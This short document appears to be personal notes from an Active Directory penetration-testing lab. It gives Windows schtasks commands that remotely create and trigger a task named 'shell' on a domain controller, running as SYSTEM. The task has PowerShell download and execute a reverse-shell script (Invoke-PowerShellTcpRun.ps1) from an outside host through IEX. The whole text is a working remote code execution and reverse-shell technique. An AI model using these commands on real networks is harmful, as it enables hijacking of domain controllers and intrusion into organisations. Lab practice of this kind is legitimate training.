# Mind the quotes. Use encoded commands if quoting becomes a pain.
schtasks /create /tn "shell" /ru "NT Authority\SYSTEM" /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr "Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"

# to trigger 
schtasks /RUN /TN "shell" /s dcorp-dc.dollarcorp.moneycorp.local
